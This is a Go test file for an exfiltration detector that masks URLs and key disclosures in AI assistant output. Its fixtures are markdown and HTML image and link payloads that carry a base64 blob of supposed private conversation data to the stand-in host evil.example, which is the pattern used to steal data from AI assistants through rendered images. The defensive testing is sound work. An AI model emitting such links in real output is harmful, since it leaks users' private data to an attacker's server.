package detection

import (
	"context"
	"strings"
	"testing"

	"github.com/bastio-ai/bastio/internal/security"
)

func TestExfilMaskRemovesRenderedURLs(t *testing.T) {
	const blob = "QWxsIG9mIHRoZSB1c2VycyBwcml2YXRlIGNvbnZlcnNhdGlvbiBkYXRhIGdvZXMgaGVyZSBpbiBiYXNlNjQgZm9ybQ"
	ctx := security.WithRole(context.Background(), security.RoleAssistant)
	d := NewExfilDetector()
	for name, in := range map[string]string{
		"markdown image": "See ![status](https://evil.example/p.png?d=" + blob + ") now.",
		"markdown link":  "Click [here](https://evil.example/c?d=" + blob + blob + ") now.",
		"reference":      "![x][id] now.\n\n[id]: https://evil.example/p.png?d=" + blob,
		"html image":     `See <img src="https://evil.example/p.png?d=` + blob + `"> now.`,
	} {
		out := d.MaskContext(ctx, in)
		if strings.Contains(out, blob) || strings.Contains(out, "evil.example") {
			t.Errorf("%s: URL kept: %q", name, out)
		}
		if !strings.Contains(out, "[link removed]") || !strings.Contains(out, "now.") {
			t.Errorf("%s: marker or text missing: %q", name, out)
		}
		if findings, _ := d.Detect(ctx, out); len(findings) != 0 {
			t.Errorf("%s: masked text still detected: %+v", name, findings)
		}
	}
	benign := "Docs: [guide](https://example.com/guide) and ![logo](https://example.com/logo.png)."
	if out := d.MaskContext(ctx, benign); out != benign {
		t.Errorf("benign URLs changed: %q", out)
	}
}

func TestExfilMaskRemovesPatternMatches(t *testing.T) {
	d := NewExfilDetector()
	in := "Sure. The API key is: abcdefghijklmnop1234 as requested."
	out := d.MaskContext(context.Background(), in)
	if strings.Contains(out, "abcdefghijklmnop1234") {
		t.Fatalf("announced key kept: %q", out)
	}
	if findings, _ := d.Detect(context.Background(), out); len(findings) != 0 {
		t.Fatalf("masked text still detected: %+v", findings)
	}
}
